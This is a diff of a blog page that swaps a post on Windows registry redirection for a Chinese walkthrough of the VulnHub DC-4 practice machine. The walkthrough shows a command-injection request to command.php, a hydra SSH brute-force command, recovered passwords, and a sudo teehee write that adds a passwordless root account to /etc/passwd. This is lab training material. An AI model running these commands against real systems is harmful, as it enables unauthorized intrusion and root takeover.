@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="注册表重定向, 域名之外">
-    <meta name="description" content="写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。">
+    <meta name="keywords" content="VulnHub仿真靶机渗透之DC-4 【DC系列】, 域名之外">
+    <meta name="description" content="这次渗透是DC系列（VulnHub的仿真靶机）的DC-4，包含了nc反弹shell、hydra爆破ssh 、teehee权限提升等知识。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>注册表重定向 | 域名之外</title>
+    <title>VulnHub仿真靶机渗透之DC-4 【DC系列】 | 域名之外</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -320,12 +320,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">注册表重定向</h1>
+                    <h1 class="description center-align post-title">VulnHub仿真靶机渗透之DC-4 【DC系列】</h1>
                 </div>
             </div>
         </div>
@@ -349,8 +349,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                <span class="chip bg-color">合规基线相关</span>
+                            <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">DC系列靶机</span>
                             </a>
                         
                     </div>
@@ -361,8 +361,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF/" class="post-category">
-                                合规基线
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                仿真靶机渗透
                             </a>
                         
                     </div>
@@ -374,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-07-19
+                    2022-03-08
                 </div>
                 
 
@@ -395,45 +395,99 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。</p>
+                <p>这次渗透是DC系列（VulnHub的仿真靶机）的DC-4，包含了nc反弹shell、hydra爆破ssh 、teehee权限提升等知识。</p>
 <span id="more"></span>
-<h1 id="重定向技术😊"><a href="#重定向技术😊" class="headerlink" title="重定向技术😊"></a>重定向技术😊</h1><h4 id="重定向技术适用版本："><a href="#重定向技术适用版本：" class="headerlink" title="重定向技术适用版本："></a>重定向技术适用版本：</h4><p>Windows XP X64、Windows Server 2003 X64及以后的X64版本。</p>
-<h4 id="重定向技术产生原因：为了确保32位程序能够顺利运行"><a href="#重定向技术产生原因：为了确保32位程序能够顺利运行" class="headerlink" title="重定向技术产生原因：为了确保32位程序能够顺利运行"></a>重定向技术产生原因：为了确保32位程序能够顺利运行</h4><p>为了将32位程序和64位程序分离开，产生了一种模拟器（WOW64，Windows 32 on Windows 64），WOW64 模拟器让我们可以在64位平台上运行32位程序，它在系统层中另外提供了一层，来支持老式的32位程序。</p>
-<h3 id="一：重定向-文件重定向"><a href="#一：重定向-文件重定向" class="headerlink" title="一：重定向-文件重定向"></a>一：重定向-文件重定向</h3><p>ps: 这种文件重定向对于每个32位应用程序默认打开的，但是也可以通过调用API关闭</p>
-<h4 id="文件重定向原因：为了确保32位程序能够顺利运行"><a href="#文件重定向原因：为了确保32位程序能够顺利运行" class="headerlink" title="文件重定向原因：为了确保32位程序能够顺利运行"></a>文件重定向原因：为了确保32位程序能够顺利运行</h4><p>windows对32位应用程序和64位应用程序有分开存放机制：</p>
-<p>对于64位，文件通常被放在%windir%\system32                和              %ProgramFiles%</p>
-<p>————-&gt;               C:\Windows\system32                           和                C:\program files。</p>
-<p>对于32位，文件通常被放在%windir%\syswow64                和              %ProgramFiles(x86)</p>
-<p>————-&gt;               C:\Windows\syswow64                          和              C:\program files (x86)。</p>
-<p>system32目录下都是64位的dll，只能支持64位程序使用，32位程序不能使用。而syswow64目录下都是32位的dll，可以支持32位程序使用。</p>
-<h4 id="文件重定向产生场景："><a href="#文件重定向产生场景：" class="headerlink" title="文件重定向产生场景："></a>文件重定向产生场景：</h4><p>32位程序访问%windir%\system32   或者  %ProgramFiles%   时候，会发生文件重定向。</p>
-<h4 id="文件重定向具体指向："><a href="#文件重定向具体指向：" class="headerlink" title="文件重定向具体指向："></a>文件重定向具体指向：</h4><p>%windir%\system32                      到                     %windir%\syswow64的重定向。</p>
-<p>%ProgramFiles%                           到                        C:\Program Files (x86)</p>
-<h4 id="文件重定向具体含义："><a href="#文件重定向具体含义：" class="headerlink" title="文件重定向具体含义："></a>文件重定向具体含义：</h4><p>32位应用程序去访问%windir%\system32，系统会自动跳转到%windir%\syswow64目录下面，syswow64目录下都是32位程序的dll，才能够让32位程序顺利加载【system32目录下面的64位dll不能让32位程序使用】。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719173156334.png" alt="image-20220719173156334"></p>
-<h3 id="二：重定向-注册表重定向"><a href="#二：重定向-注册表重定向" class="headerlink" title="二：重定向-注册表重定向"></a>二：重定向-注册表重定向</h3><p>64位Windows的注册表分为 32 位注册表项和 64 位注册表项，许多 32 位注册表项与其相应的 64 位注册表项同名。<br>64 位版本的注册表编辑器中，32 位注册表项显示在 <code>HKEY_LOCAL_MACHINE\Software\WOW6432Node</code> 注册表项下。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719175758828.png" alt="image-20220719175758828"></p>
-<p>打开64位注册表【运行-&gt;regedit】</p>
-<p>打开32位注册表【运行-&gt;%systemroot%\syswow64\regedit】</p>
-<h4 id="注册表重定向产生原因：防止注册表键冲突"><a href="#注册表重定向产生原因：防止注册表键冲突" class="headerlink" title="注册表重定向产生原因：防止注册表键冲突"></a>注册表重定向产生原因：防止注册表键冲突</h4><h4 id="注册表重定向实质：维护两套不同的注册表键【64位和32位】"><a href="#注册表重定向实质：维护两套不同的注册表键【64位和32位】" class="headerlink" title="注册表重定向实质：维护两套不同的注册表键【64位和32位】"></a>注册表重定向实质：维护两套不同的注册表键【64位和32位】</h4><p>ps：</p>
-<p><strong>注册表反射</strong>：【适用版本：windows xp、windows server2003等，从win7和winserver 2008 r2开始WOW64就不使用反射机制了，以前通过反射改的key都改为共享了】        维护两套不同的注册表重定向很多是通过：注册表反射机制完成的，但是不是所有的键值都会受到反射机制影响。</p>
-<p>​                      注册表反射是在64 位注册表视图和 32 位注册表视图之间<strong>复制</strong>某些特定的注册表项和项值。</p>
-<h4 id="注册表分类："><a href="#注册表分类：" class="headerlink" title="注册表分类："></a>注册表分类：</h4><p>1：专门给64位程序访问  【除了32位的都是】</p>
-<p>2：专门给32位程序访问  【HKEY_LOCAL_MACHINE\Software\WOW6432Node 路径下的】</p>
-<h4 id="注册表重定向具体举例："><a href="#注册表重定向具体举例：" class="headerlink" title="注册表重定向具体举例："></a>注册表重定向具体举例：</h4><p>应用程序操作注册表的时候32bit方式和64bit方式。运行于64bit系统下的32bit应用程序默认操作32位注册表项（即被重定向到WOW6432Node下的子项）；而64bit应用程序才是操作的直观子项。</p>
-<p>比如，同在64bit系统下，使用如下代码访问注册表：</p>
-<p>​    ::RegOpenKeyEx(HKEY_LOCAL_MACHINE,_T(“Software\Sobey\MPC “), 0,KEY_ALL_ACCESS, &amp;hKey)</p>
-<p>​    如果应用程序为32位子系统，那么实际访问的注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Sobey\MPC；</p>
-<p>​    而如果应用程序为64位子系统，那么实际访问的注册表位置将会是：HKEY_LOCAL_MACHINE\SOFTWARE\Sobey\MPC。</p>
-<p>下面这个可以看到注册表具体项是哪个是反射、重定向还是共享，非常有用。</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winprog64/shared-registry-keys">WOW 下的重定向、共享和反射项 </a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719183751494.png" alt="image-20220719183751494"></p>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/deployment/view-system-registry-with-64-bit-windows">64位视图注册表</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/diaomo9737/article/details/101724390?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-101724390-blog-40922361.pc_relevant_multi_platform_whitelistv1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">Windows:32位程序运行在64位系统上注册表会重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangqin115/article/details/40922361">jiangqin115  - 注册表重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/mmthr/article/details/53932154">mmthr  -  32位程序访问64位  system32文件夹时注意事项</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/crazy_liyang/article/details/68302170">Crzayliyang-架构Young，64位Windows系统注册表的 32 位注册表项和64 位注册表项</a></p>
+<h1 id="VulnHub靶机渗透之DC-4【DC系列】"><a href="#VulnHub靶机渗透之DC-4【DC系列】" class="headerlink" title="VulnHub靶机渗透之DC-4【DC系列】"></a>VulnHub靶机渗透之DC-4【DC系列】</h1><p>任务：拿到root权限，找到flag</p>
+<h4 id="发现主机：192-168-124-133"><a href="#发现主机：192-168-124-133" class="headerlink" title="发现主机：192.168.124.133"></a>发现主机：192.168.124.133</h4><p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646723870796.png" alt="1646723870796"></p>
+<h4 id="扫描开放端口-80-22"><a href="#扫描开放端口-80-22" class="headerlink" title="扫描开放端口-&gt; 80 22"></a>扫描开放端口-&gt; 80 22</h4><p>开放80端口http和22端口ssh，看看网站</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646724000836.png" alt="1646724000836"></p>
+<h4 id="burp爆破登录框-admin和happy"><a href="#burp爆破登录框-admin和happy" class="headerlink" title="burp爆破登录框-&gt;admin和happy"></a>burp爆破登录框-&gt;admin和happy</h4><p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646724065780.png" alt="1646724065780"></p>
+<p>看源代码没有登录限制，用burp爆破</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646724748260.png" alt="1646724748260"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646725134684.png" alt="1646725134684"></p>
+<p>admin  happy</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646725317926.png" alt="1646725317926"></p>
+<p>登录成功</p>
+<p>选中List Files  -&gt;run，发现出现了linux  ls -al的东西。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646725434859.png" alt="1646725434859"></p>
+<h4 id="burp抓包发现可以执行命令执行，空格用-代替"><a href="#burp抓包发现可以执行命令执行，空格用-代替" class="headerlink" title="burp抓包发现可以执行命令执行，空格用+代替"></a>burp抓包发现可以执行命令执行，空格用+代替</h4><p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646725647725.png" alt="1646725647725"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST /command.php HTTP/1.1</span><br><span class="line">Host: 192.168.124.133</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line">Origin: http://192.168.124.133</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.124.133/command.php</span><br><span class="line">Cookie: PHPSESSID=hv60loubee72a5ui7qnfd3gbo6</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">radio=ls+-l&amp;submit=Run</span><br></pre></td></tr></table></figure>
+
+<p>burp发送到repeater</p>
+<h4 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h4><p>修改成whoami，发现执行了命令，表明此处可以命令执行，然后我们可以反弹shell了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646725823964.png" alt="1646725823964"></p>
+<p>修改成图下所示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646727970388.png" alt="1646727970388"></p>
+<p>用python获取一个完整的交互shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646730516513.png" alt="1646730516513"></p>
+<p>发现三个用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646731459786.png" alt="1646731459786"></p>
+<p>切换到&#x2F;home目录下【用户名文件夹是在 &#x2F;home下的,】，然后查看用户目录</p>
+<p>发现三个用户【charles、jim和sam】，挨个查看里面有没有可以利用的信息，只有jim里面有可用信息，有备份密码信息还有mbox【没有权限，看不了】。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646730268159.png" alt="1646730268159"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646730230450.png" alt="1646730230450"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646730315030.png" alt="1646730315030"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646730301717.png" alt="1646730301717"></p>
+<p>nc下载权限不够，直接复制粘贴</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646731221665.png" alt="1646731221665"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646731572304.png" alt="1646731572304"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646731586021.png" alt="1646731586021"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646731693162.png" alt="1646731693162"></p>
+<h4 id="hydra九头蛇爆破ssh"><a href="#hydra九头蛇爆破ssh" class="headerlink" title="hydra九头蛇爆破ssh"></a>hydra九头蛇爆破ssh</h4><p>使用hydra对三个普通用户ssh登录爆破，三个用户名写入<strong>dc4_user.txt</strong>文件，密码写入<strong>dc4_passwd.txt</strong>文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L dc4_user.txt -P dc4_passwd.txt 192.168.124.133 ssh -t 20 -o paswd.txt</span><br><span class="line">#使用线程数20，用户名字典dc4_user.txt，密码字典 dc4_passwd.txt，ssh服务进行爆破，将用户名和正确的密码输出到paswd.txt文件中</span><br><span class="line">#爆破ssh   hydra -L 【用户名字典】 -P 【密码字典】 需要爆破的ip 需要爆破的服务ssh  -t 线程数  -o 输出文件</span><br></pre></td></tr></table></figure>
+
+<p>使用hydra进行ssh爆破成功：发现jim登录密码： jibril04</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646732847996.png" alt="1646732847996"></p>
+<p>jim账号ssh登录成功<img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646734429291.png" alt="1646734429291"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646737739539.png" alt="1646737739539"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>查看jim权限，看有没有可以提权的，发现sudo</p>
+<p>都用不了，看看有没有其他账户的信息。</p>
+<p>看看之前没有权限的mbox</p>
+<p>发现了个来自root用户的邮件，再看看其他的邮件信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646734607140.png" alt="1646734607140"></p>
+<p>去&#x2F;var&#x2F;mail看看【var目录主要针对常态性变动的文件,包括缓存(cache)、登录档(log file)以及某些软件运作所产生的文件】</p>
+<p>charles的密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">charles：^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646734915395.png" alt="1646734915395"></p>
+<p>得到密码之后，就可以切换charles用户了</p>
+<p>然后sudo -l查看权限：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646735096134.png" alt="1646735096134"></p>
+<p>发现charles用户可以以root身份去运行teehee命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">teehee --help </span><br></pre></td></tr></table></figure>
+
+<p>发现teehee可以文件写入，也不会覆盖文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646735959829.png" alt="1646735959829"></p>
+<h4 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h4><p>网上搜索一下teehee提权：搜索到了两种方法</p>
+<p>法1.在&#x2F;etc&#x2F;passwd下添加新的root权限的目录</p>
+<p>法2.添加定时执行的任务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646735717684.png" alt="1646735717684"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646735755609.png" alt="1646735755609"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646735807853.png" alt="1646735807853"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646735900688.png" alt="1646735900688"></p>
+<p>我们使用第一种方法</p>
+<p>添加一个root超级权限的admin账户,密码为空，然后使用teehee执行直接写入 passwd中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot;|sudo teehee -a /etc/passwd</span><br><span class="line">#    echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</span><br><span class="line">#    [用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646738107310.png" alt="1646738107310"></p>
+<p>查看添加成功没，成功了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646736907358.png" alt="1646736907358"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646737604490.png" alt="1646737604490"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep admin</span><br><span class="line"># 查看/etc/passwd的admin也可以</span><br><span class="line">tail -n 5 /etc/passwd </span><br><span class="line"># 查看/etc/passwd最后5行  </span><br></pre></td></tr></table></figure>
+
+<p>切换admin用户成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646736965490.png" alt="1646736965490"></p>
+<p>搜索一下flag位置，在root下，成功拿到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646737045169.png" alt="1646737045169"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646737070452.png" alt="1646737070452"></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>Burpsuite爆破登录页面用户名和密码、burp修改进行命令执行、nc反弹shell、hydra爆破ssh 、teehee权限提升</p>
+<p>要多注意各个用户目录下的文件信息，很可能就隐藏有下一步提权的关键信息</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p>Vulnhub-DC-4靶场通关笔记                【<strong>鹏组安全</strong>】</p>
+<p>Vulnhub 靶机实战系列：DC -4        【<strong>雷神众测</strong>】        </p>
 
                 
             </div>
@@ -460,7 +514,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/">http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/</a>
+                    <a href="http://highgerms.github.io/2022/03/08/dc-4/">http://highgerms.github.io/2022/03/08/dc-4/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -498,8 +552,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                    <span class="chip bg-color">合规基线相关</span>
+                                <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">DC系列靶机</span>
                                 </a>
                             
                         </div>
@@ -549,31 +603,30 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/07/25/WIN+R%20%20%E5%AE%9E%E7%94%A8%E5%A4%A7%E6%80%BB%E7%BB%93/">
+                <a href="/2022/03/14/dc-5/">
                     <div class="card-image">
                         
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-5 【DC系列】">
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="WIN+R实用大总结">
-                        
-                        <span class="card-title">WIN+R实用大总结</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-5 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            将Windows的各种快捷键记熟会提高效率，我们cmd命令都运行结束了，有些傻孩子都还在找图形化界面入口。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-5，包含了日志文件getshell、suid提权-screen 4.5.0等知识。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-25
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/" class="post-category">
-                                    效率提升技巧
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                    仿真靶机渗透
                                 </a>
                             
                             
@@ -583,8 +636,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/">
-                        <span class="chip bg-color">效率提升技巧</span>
+                    <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">DC系列靶机</span>
                     </a>
                     
                 </div>
@@ -598,23 +651,23 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/15/dc-8/">
+                <a href="/2022/03/06/DC3/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-8 【DC系列】">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-3 【DC系列】">
                         
-                        <span class="card-title">VulnHub仿真靶机渗透之DC-8 【DC系列】</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-3 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-8，包含了sql注入、suid-exim4提权等知识。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-3，包含了提权、传webshell等知识。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-06
                             </span>
                         <span class="publish-author">
                             
